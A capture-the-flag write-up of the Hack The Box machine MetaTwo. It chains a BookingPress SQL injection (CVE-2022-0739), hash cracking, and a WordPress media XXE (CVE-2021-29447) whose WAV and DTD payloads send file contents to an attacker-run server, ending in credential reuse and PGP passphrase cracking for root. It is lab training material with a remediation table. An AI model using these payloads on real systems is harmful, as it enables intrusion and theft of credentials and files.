# MetaTwo — a WordPress booking plugin that books you a shell

[![Difficulty](https://img.shields.io/badge/difficulty-Easy-green)](https://app.hackthebox.com/machines/metatwo)
[![OS](https://img.shields.io/badge/OS-Linux-blue)](https://app.hackthebox.com/machines/metatwo)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=Alx5KQWq7ZM)

> **Attack path:** BookingPress plugin unauthenticated SQLi (CVE-2022-0739) → WordPress
> user hashes → `manager` login → WordPress 5.6.2 media XXE (CVE-2021-29447) → read
> `wp-config.php` → FTP → `send_email.php` SMTP creds → SSH as `jnelson` → crack the
> passpie PGP key → `su root`.

Credentials and flags are intentionally redacted as `<password>` / `<flag>` / `<hash>` —
you should recover them yourself while working the box.

## 1 · Reconnaissance

```bash
nmap -p- --min-rate 10000 10.10.11.186
nmap -p 21,22,80 -sCV 10.10.11.186
```

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp?    (220 ProFTPD Server (Debian) -- anonymous login denied)
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
```

Add the domain (no other subdomains found by `wfuzz -u http://10.10.11.186 -H
"Host: FUZZ.metapress.htb" -w subdomains-top1million-5000.txt --hh 145`):

```text
10.10.11.186 metapress.htb
```

The site is a **WordPress 5.6.2** blog on PHP 8.0.24. Its one post links to `/events/`,
which embeds a booking widget from the **BookingPress** plugin
(`wp-content/plugins/bookingpress-appointment-booking/`), version below 1.0.11.

## 2 · Foothold

### BookingPress unauthenticated SQLi (CVE-2022-0739)

The `bookingpress_front_get_category_services` AJAX action is reachable without a
session; it only requires the WordPress nonce, which is printed in the `/events/` page
source next to `action:'bookingpress_front_get_category_services'`. Manual PoC
(9-column UNION):

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=<nonce>&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

Save a clean request (with `total_service=223`) to `sqli.req` and hand it to sqlmap:

```bash
sqlmap -r sqli.req -p total_service --batch
sqlmap -r sqli.req -p total_service --dbs
sqlmap -r sqli.req -p total_service -D blog --tables
sqlmap -r sqli.req -p total_service -D blog -T wp_users --dump
```

`wp_users` yields two phpass (`$P$B...`) hashes:

```text
admin   | <hash>   (not cracked)
manager | <hash>
```

```bash
echo 'manager:<hash>' > wp.hashes
hashcat -m 400 wp.hashes /usr/share/wordlists/rockyou.txt --user
```

The `manager` password cracks quickly → `<password>`. It does not work on SSH or FTP,
but logs in at `/wp-admin`. The account has almost no capabilities beyond **media
uploads**.

### WordPress 5.6.2 media XXE (CVE-2021-29447)

WP 5.6.2 parses uploaded `.wav` files containing iXML metadata as XML without disabling
external entities. Build a malicious WAV pointing at a remote DTD:

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://<tun0-ip>/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

`evil.dtd` exfiltrates any file base64-encoded through the `php://filter` wrapper:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://<tun0-ip>/?p=%file;'>">
```

Serve the DTD (`python3 -m http.server 80`), upload `payload.wav` via the media manager,
and watch the GET request arrive with the base64 blob. Decoding `/etc/passwd` reveals the
user `jnelson`. Change the DTD target to a relative path and re-upload:

```xml
... resource="../wp-config.php" ...
```

`wp-config.php` now discloses the database credentials **and** the FTP credentials
WordPress uses for upgrades:

```php
define( 'DB_PASSWORD', '<password>' );
define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '<password>' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
```

### FTP to SSH

```bash
ftp metapress.htb@metapress.htb
```

The share holds `blog/` (the web root — read-only, so no direct webshell) and
`mailer/send_email.php`, a PHPMailer script with hardcoded SMTP credentials:

```php
$mail->Username = "jnelson@metapress.htb";
$mail->Password = "<password>";
```

## 3 · User flag

The SMTP password is reused for SSH:

```bash
sshpass -p '<password>' ssh jnelson@metapress.htb
jnelson@meta2:~$ cat user.txt
<flag>
```

## 4 · Privilege escalation

### Enumeration

`sudo -l` → `jnelson` may not run sudo. The home directory contains a `.passpie` folder —
the vault of the [passpie](https://github.com/marcwebbie/passpie) password manager:

```text
jnelson@meta2:~$ passpie
╒══════╤═══════╤══════════╤═══════╕
│ Name │ Login │ Password │ ...   │
╞══════╪═══════╪══════════╪═══════╡
│ ssh  │ jnelson │ ******** │     │
│ ssh  │ root   │ ******** │     │
╘══════╧═══════╧══════════╧═══════╯
```

Revealing an entry requires the vault passphrase. The vault files live in
`~/.passpie/`: `.keys` (a PGP key pair) and `ssh/root.pass` (the root password as a PGP
message).

### Crack the PGP passphrase

```bash
scp jnelson@metapress.htb:~/.passpie/.keys keys
# gpg2john refuses mixed keys -- keep only the private-key block
gpg2john keys > gpg.hash
john --wordlist=/usr/share/wordlists/rockyou.txt gpg.hash
```

The passphrase cracks in seconds → `<password>`.

### Open the vault

```text
jnelson@meta2:~$ passpie copy --to stdout --passphrase <password> root@ssh
<password>
```

That is the root account's SSH password.

## 5 · Root flag

```text
jnelson@meta2:~$ su -
Password: <password>
root@meta2:~# cat root.txt
<flag>
```

## 6 · Impact & remediation

| Risk | Impact | Remediation |
| --- | --- | --- |
| BookingPress < 1.0.11 vulnerable to unauthenticated SQLi (CVE-2022-0739) | Full database dump — password hashes and site secrets — without any account | Update the plugin; WAF rules for AJAX parameter abuse; least-privilege DB user |
| WordPress 5.6.2 XXE in the media manager (CVE-2021-29447) | Low-priv authors read arbitrary files (`wp-config.php`) | Upgrade WordPress core; require recent versions in hosting policy |
| Secrets (DB, FTP, SMTP) hardcoded in `wp-config.php` / `send_email.php` | One file-read primitive cascades into FTP + SSH access | Environment-based secrets, unique per service, rotated regularly |
| Password reuse (SMTP ↔ SSH) | Web-side credential leak becomes a system shell | Distinct credentials per service; MFA on SSH where possible |
| Password-manager vault protected by a rockyou-crackable passphrase | Root credential recovered offline in seconds | Long random vault passphrases; consider hardware-backed storage |

## 7 · CPTS takeaways

- WordPress triage order that works in the exam and the field: version → plugins/themes
  (wpscan or source refs) → known CVEs for *each* component, even "low-priv" ones.
- sqlmap against a saved request file (`-r req -p param`) is faster and more reliable
  than crafting URLs — Burp "Copy to file" feeds it directly.
- XXE + `php://filter/convert.base64-encode` is the standard arbitrary-file-read chain on
  PHP targets; WordPress's media-manager XXE (CVE-2021-29447) is a named instance of it.
- After a file read, always pull configs (`wp-config.php`, `.env`) and follow credential
  reuse horizontally (FTP → SMTP → SSH) before hunting harder exploits.
- `gpg2john` + `john` cracks PGP/GPG private-key passphrases — password-manager vaults
  (passpie, keepass) are common privesc pivot points and fair game on the exam.
